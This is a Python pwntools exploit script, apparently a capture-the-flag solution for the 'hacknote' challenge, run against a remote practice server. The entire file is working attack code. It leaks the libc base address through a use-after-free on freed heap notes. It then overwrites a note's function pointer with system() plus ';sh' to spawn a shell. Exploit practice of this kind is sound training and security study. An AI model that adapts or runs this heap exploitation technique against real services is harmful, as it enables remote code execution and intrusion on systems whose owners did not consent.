from os import system
from pwn import *

context(os = 'linux', arch = 'i386', log_level = 'debug')
# io = process('hacknote')
io = remote('node4.buuoj.cn', 27984)
# libc = ELF('/lib/i386-linux-gnu/libc.so.6')
libc = ELF('libc-2.23.so')
elf = ELF('hacknote')


def add(size, content):
    io.sendlineafter('Your choice :', '1')
    io.sendlineafter('Note size :', str(size))
    io.sendafter('Content :', content)


def delete(index):
    io.sendlineafter('Your choice :', '2')
    io.sendlineafter('Index :', str(index))


def show(index):
    io.sendlineafter('Your choice :', '3')
    io.sendlineafter('Index :', str(index))


def leak_libc():
    global libc_base
    add(0x40, '\n')            
    add(0x20, '\n')
    delete(0)
    add(0x40, 'a')
    show(0)
    libc_base = u32(io.recvn(8)[-4:]) - libc.sym['__malloc_hook'] - 0x48
    log.success('libc_base: ' + hex(libc_base))
    # gdb.attach(io)
    # pause()


def pwn():
    delete(1)
    delete(0)
    system = libc_base + libc.sym['system']
    add(8, p32(system) + b';sh\x00')
    show(1)
    io.interactive()
    

if __name__ == '__main__':
    leak_libc()
    pwn()
